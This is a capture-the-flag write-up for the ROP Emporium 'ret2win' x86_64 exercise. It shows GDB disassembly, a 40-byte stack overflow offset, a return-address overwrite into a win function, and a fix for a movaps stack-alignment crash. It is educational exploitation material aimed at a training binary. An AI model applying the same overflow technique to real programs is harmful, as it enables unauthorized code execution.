# ret2win
**Provided materials**: A `ret2win` binary and a `flag.txt` file

The included `ret2win` binary asks us to enter some input into an array on the stack.
```
$ ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!
```
Up to 56 bytes are read from the keyboard, but the array can only hold 32 bytes! A classic stack buffer overflow.

After providing some input, the program thanks us and exits.
```
$ ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> hey
Thank you!

Exiting
```

I used GDB to disassemble the `main` function, which calls a function `pwnme`.
```
$ gdb ./ret2win 
Reading symbols from ./ret2win...
(No debugging symbols found in ./ret2win)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x400808
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x400820
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400828
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret
End of assembler dump.
```

Upon disassembling the `pwnme` call, I find the call to `read()`.
```
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave
   0x0000000000400755 <+109>:	ret
End of assembler dump.
```

I'll set a breakpoint on pwnme, start the program, and single step the function until the call to `read()` is reached.
```
     0x400737 <pwnme+004f>     mov    edx, 0x38
     0x40073c <pwnme+0054>     mov    rsi, rax
     0x40073f <pwnme+0057>     mov    edi, 0x0
 →   0x400744 <pwnme+005c>     call   0x400590 <read@plt>
   ↳    0x400590 <read@plt+0000>  jmp    QWORD PTR [rip+0x200aa2]        # 0x601038 <read@got.plt>
        0x400596 <read@plt+0006>  push   0x4
        0x40059b <read@plt+000b>  jmp    0x400540
        0x4005a0 <setvbuf@plt+0000> jmp    QWORD PTR [rip+0x200a9a]        # 0x601040 <setvbuf@got.plt>
        0x4005a6 <setvbuf@plt+0006> push   0x5
        0x4005ab <setvbuf@plt+000b> jmp    0x400540
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffffffdd10 → 0x0000000000000000,
   $rdx = 0x0000000000000038
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped 0x400744 in pwnme (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400744 → pwnme()
[#1] 0x4006d7 → main()
```

GEF shows that `read()` takes three arguments: `0` to read from stdin, the address of the target array (`0x7fffffffdd10`), and the number of bytes to read (`0x38`).

I then use GDB to calculate the distance between the start of the array and the saved return address on the stack. It comes out to `0x28` (40) bytes.
```
gef➤  info frame
Stack level 0, frame at 0x7fffffffdd40:
 rip = 0x4006ec in pwnme; saved rip = 0x4006d7
 called by frame at 0x7fffffffdd50
 Arglist at 0x7fffffffdd30, args: 
 Locals at 0x7fffffffdd30, Previous frame's sp is 0x7fffffffdd40
 Saved registers:
  rbp at 0x7fffffffdd30, rip at 0x7fffffffdd38
gef➤  p 0x7fffffffdd38 - 0x7fffffffdd10
$1 = 0x28
```

> Note: The instructions confirm that each challenge needs 40 bytes of padding to reach the saved return address in the x86_64 binaries, so subsequent writeups will not cover this detail.

Now that I know the amount of padding for my solution, it's time to locate an address that will call code to print out the flag. Via `objdump`, I find an interesting function `ret2win`.
```
$ objdump -M intel -d ret2win
ret2win:     file format elf64-x86-64
[...]
Disassembly of section .text:
[...]
0000000000400756 <ret2win>:
  400756:	55                   	push   rbp
  400757:	48 89 e5             	mov    rbp,rsp
  40075a:	bf 26 09 40 00       	mov    edi,0x400926
  40075f:	e8 ec fd ff ff       	call   400550 <puts@plt>
  400764:	bf 43 09 40 00       	mov    edi,0x400943
  400769:	e8 f2 fd ff ff       	call   400560 <system@plt>
  40076e:	90                   	nop
  40076f:	5d                   	pop    rbp
  400770:	c3                   	ret
  400771:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  400778:	00 00 00 
  40077b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
[...]
```

The function prints a string at `0x400926` with `puts()`, then calls `system()` to run a command stored at `0x400943`. The command turns out to be `/bin/cat flag.txt`.
```
gef➤  x/s 0x400943
0x400943:	"/bin/cat flag.txt"
```

Great! I can now tack `0x400756` (must be little endian!) at the end of my payload and the flag should print. Right? After creating a quick pwntools script to send my payload to `ret2win`, this happens.
```
$ python3 solution.py 
[+] Starting local process './ret2win': pid 27654
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
[*] Got EOF while reading in interactive
$ 
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 27654)
[*] Got EOF while sending in interactive
```

Why does it segfault before printing the flag? I test the payload with GDB open, and the program returns from `pwnme()` to `ret2win()` as expected. However, it segfaults while trying to execute `system()`.
```
   0x7ffff7c58428 <do_system+0158> lea    rsi, [rip+0x173000]        # 0x7ffff7dcb42f
   0x7ffff7c5842f <do_system+015f> mov    QWORD PTR [rsp+0x70], 0x0
   0x7ffff7c58438 <do_system+0168> mov    r9, QWORD PTR [rax]
 → 0x7ffff7c5843b <do_system+016b> movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7ffff7c58440 <do_system+0170> call   0x7ffff7d0edd0 <__GI___posix_spawn>
   0x7ffff7c58445 <do_system+0175> mov    rdi, rbx
   0x7ffff7c58448 <do_system+0178> mov    r12d, eax
   0x7ffff7c5844b <do_system+017b> call   0x7ffff7d0f2b0 <__posix_spawnattr_destroy>
   0x7ffff7c58450 <do_system+0180> test   r12d, r12d
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped 0x7ffff7c5843b in do_system (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7c5843b → do_system(line=0x400943 "/bin/cat flag.txt")
[#1] 0x40076e → ret2win()
[#2] 0x7fffffffdd90 → lock (bad)
[!] Cannot access memory at address 0x41414141414140c9
```

More specifically, the segfault appears to occur on a `movaps` instruction within another function `do_system()`. I then remembered the [Beginners' guide](https://ropemporium.com/guide.html) page on the ROP Emporium website. Sure enough, the answer was under the "Common pitfalls" section:
```
**The MOVAPS issue**  
If you're segfaulting on a `movaps` instruction in `buffered_vfprintf()` or `do_system()` in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as `printf()` or `system()`. Some versions of GLIBC uses `movaps` instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a `call` instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. `movaps` triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra `ret` before returning into a function or return further into a function to skip a `push` instruction.
```

The stack pointer (register `rsp`) was set to `0x7fffffffd938` at the segfault. The `movaps` expects a 16-byte aligned stack, so the address in `rsp` must be a multiple of 16 for the instruction to succeed. The guide provides two options: provide a `ret` instruction just before returning to `ret2win()` or skip a `push` instruction in `ret2win()`. My payload currently returns to the `push rbp` at the start of the function (`0x400756`), which happens to misalign the stack. What if I return to `0x400757`, just one instruction after?
```
$ python3 solution.py 
[+] Starting local process './ret2win': pid 28195
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2win' stopped with exit code 0 (pid 28195)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

Mission accomplished!